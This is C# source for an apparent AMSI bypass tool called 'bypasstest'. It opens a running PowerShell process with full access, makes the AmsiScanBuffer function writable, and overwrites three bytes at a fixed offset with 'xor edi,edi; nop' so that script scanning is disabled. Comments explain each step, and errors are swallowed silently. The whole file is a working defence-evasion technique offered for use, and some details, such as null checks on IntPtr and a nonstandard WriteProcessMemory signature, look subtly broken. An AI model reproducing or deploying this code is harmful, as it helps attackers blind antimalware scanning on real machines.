using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace bypasstest
{
    class Program
    {
        public enum Protection : uint
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }

        public enum ProcessAccessFlags : uint
        {
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VMOperation = 0x00000008,
            VMRead = 0x00000010,
            VMWrite = 0x00000020,
            DupHandle = 0x00000040,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            Synchronize = 0x00100000,
            All = 0x001F0FFF
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string ddltoLoad);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, Protection flNewProtect, IntPtr lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(IntPtr hProcess,IntPtr lpAddress, uint dwSize, Protection flNewProtect, IntPtr lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "WriteProcessMemory", SetLastError = false)]
        private static unsafe extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, int nSize);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        //allow us to catch a System.AccessViolationException in managed code and continue
        [System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
        [System.Security.SecurityCritical]
        static void Main(string[] args)
        {
            IntPtr dllHandle = LoadLibrary("amsi.dll"); //load the amsi.dll
            if (dllHandle == null) return;

            //Get the AmsiScanBuffer function address
            IntPtr AmsiScanbufferAddr = GetProcAddress(dllHandle, "AmsiScanBuffer");
            if (AmsiScanbufferAddr == null) return;

            Process targetProcess = Process.GetProcessesByName("powershell")[0];
            IntPtr procHandle = OpenProcess(ProcessAccessFlags.All, false, targetProcess.Id);

            IntPtr OldProtection = Marshal.AllocHGlobal(4); //pointer to store the current AmsiScanBuffer memory protection

            //Pointer changing the AmsiScanBuffer memory protection from readable only to writeable (0x40)
            bool VirtualProtectRc = VirtualProtectEx(procHandle, AmsiScanbufferAddr, 0x0015, Protection.PAGE_EXECUTE_READWRITE, OldProtection);
            if (VirtualProtectRc == false) return;

            var patch = new byte[] { 0x31, 0xff, 0x90 };

            //Setting a pointer to the patch opcode array (unmanagedPointer)
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(patch, 0, unmanagedPointer, 3);
            try{
              //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
              WriteProcessMemory(procHandle, AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);
            } catch {
              //silent continue
            }
        }
    }
}

